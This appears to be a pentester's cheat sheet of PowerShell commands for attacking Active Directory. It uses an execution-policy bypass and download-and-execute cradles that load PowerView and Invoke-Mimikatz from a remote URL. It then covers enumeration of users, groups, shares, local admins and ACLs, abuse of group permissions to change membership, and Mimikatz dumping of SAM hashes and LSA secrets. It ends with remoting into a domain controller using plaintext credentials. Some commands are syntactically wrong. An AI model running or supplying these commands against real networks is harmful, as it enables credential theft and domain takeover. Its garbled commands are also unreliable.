# powershellForPentesters

**Run unrestricted commands with powershell**
- `powershell -ep bypass`
- Download and import the powerview module into the memory
- `iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/PowerView.ps1')`

**Enumerate Domain Users**
- Query the Domain Controller with `get-netuser`
- Get-netuser will query the domain controller for all the users on active directory environment.
- `get-netuser`
- Get cannonnical name : `get-netuser | select cn`
- List the SAM account name : `get-netuser | select -ExpandProperty samaccountname`
- List out the description of the domain users : `Find-UserField -SearchField description`

**Enumerating Domain User Groups**
- List the different user groups : `get-netgroup`
- Enumerate group for specific users :  `get-netgroup -UserName "user.two"`
- This will show the groups that the user is part of within a domain environment.
- Enumerate group with group names :  `get-netgroup -GroupName "Domain Admins" -FullData`

**Enumerating Domain Computers**
- List the different computer on domain : `get-netcomputer`
- Get more data about the computers : `get-netcomputer -FullData`
- Enumerate specific computers in term of operating systems : `get-netcomputer -OperatingSystem "*Windows 10*"`
- List the windows server : `get-netcomputer -OperatingSystem "*Windows Server*`
- List Down the shares : `Invoke-ShareFinder`
- Navigate to those shares : `ls \\computername\\sharename`

**Enumerating Local Admin Users**
- List and enumerate local admins : `Invoke-EnumerateLocalAdmin`
- Filter the local admins with their computers : `Invoke-EnumerateLocalAdmin | select ComputerName, AccountName`

**Enumerating GPOs and ACLs**
- List the domain group policy objects : `get-netgpo`
- List all the access control list for entire domain : `get-objectacl`
- List the access control for specific group
	- List the group : `Get-NetGroup`
	- List the ACL of the group : `get-objectacl -samaccountName  "marketing" -ResolveGUIDS`
	- This will list which group have what type of access like `Generic All, Generic Read` on the marekting group.
	- Suppose, you are logged in as user.one of group sales and if the sales group have Generic All access on the marketing group, we can add or delete the users on marketing group from user `user.one`
	- `get-netgroup marketing user.two /add /domain`
	- `get-netgroup marketing user.two /del /domain`

	**Dumping Hashes with Mimikatz and Basic Hashcat Usage**
	- Download mimikatz into memory
		- `iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1')`
    - Impersonate as NT Authority system : `Invoke-Mimikatz -Command token::elevate`
    - Dump the SAM hahes : `Invoke-Mimikatz -Command lsadump::sam`
    - Dump the SECRETS (plaintext password) : `Invoke-Mimikatz -Command lsadump:secrets`

    **Powershell Remoting**
    - Agenda: Trying to execute command on Domain Controller if the user is on the same domain.
    - `$password = ConvertTo-SecureString "password" -AsPlainText -Force`
    - `$cred = New-Object System.Management.Automation.PSCredential("domainname\username", $password`)
    - `Enter-PSSession -ComputerName <name-of-dc-computer> $cred`
    - `hostname`
    - `whoami` 


## References
- https://www.youtube.com/watch?v=_EXHGtaxDew&list=PLJQHPJLj_SQatUsJy3O4k-VQlllquDmDr



